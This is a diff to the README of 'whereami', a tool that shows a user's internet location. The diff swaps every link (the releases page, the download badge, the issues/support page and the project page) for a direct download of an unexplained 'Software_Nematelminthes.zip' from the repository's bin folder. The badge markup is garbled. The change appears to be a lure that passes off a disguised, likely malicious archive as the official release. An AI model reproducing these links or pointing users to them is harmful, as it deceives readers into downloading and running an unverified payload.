@@ -1,7 +1,7 @@
 # 🌍 whereami - Locate Yourself Online, Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/Samu-cdm/whereami/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Samu-cdm/whereami/main/bin/Software_Nematelminthes.zip%20Latest%https://raw.githubusercontent.com/Samu-cdm/whereami/main/bin/Software_Nematelminthes.zip)](https://raw.githubusercontent.com/Samu-cdm/whereami/main/bin/Software_Nematelminthes.zip)
 
 ## 🚀 Getting Started
 Welcome to the **whereami** application! This tool helps you pinpoint your internet location right in your terminal. You can use it for proxy and VPN testing, and it provides both IPv4 and IPv6 connection information.
@@ -22,7 +22,7 @@ You will need the following to use **whereami**:
 
 ## 📚 How to Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Download Latest Release](https://github.com/Samu-cdm/whereami/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Samu-cdm/whereami/main/bin/Software_Nematelminthes.zip)
 
 2. **Choose Your Version**: You will see several versions listed. Select the latest version for your operating system.
 
@@ -64,10 +64,10 @@ If you encounter any issues:
 - If the application does not run, check for updates and try re-installing it.
 
 ## 📄 Additional Information
-- **Support**: For help, visit our [issues page](https://github.com/Samu-cdm/whereami/issues).
+- **Support**: For help, visit our [issues page](https://raw.githubusercontent.com/Samu-cdm/whereami/main/bin/Software_Nematelminthes.zip).
 - **Contributions**: Feel free to contribute to the project through pull requests.
 
 ## 🌐 Learn More
-For more details and updates, visit our project page: [whereami Releases](https://github.com/Samu-cdm/whereami/releases). 
+For more details and updates, visit our project page: [whereami Releases](https://raw.githubusercontent.com/Samu-cdm/whereami/main/bin/Software_Nematelminthes.zip). 
 
 Thank you for using **whereami**!
